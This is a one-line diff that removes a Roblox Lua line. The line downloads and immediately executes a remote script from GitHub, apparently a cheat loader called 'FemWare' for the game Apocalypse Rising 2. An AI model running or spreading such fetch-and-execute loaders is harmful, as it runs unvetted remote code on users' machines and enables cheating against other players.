@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/JackHiggly/FemWare/main/Apocalypse%20Rising%202"))()
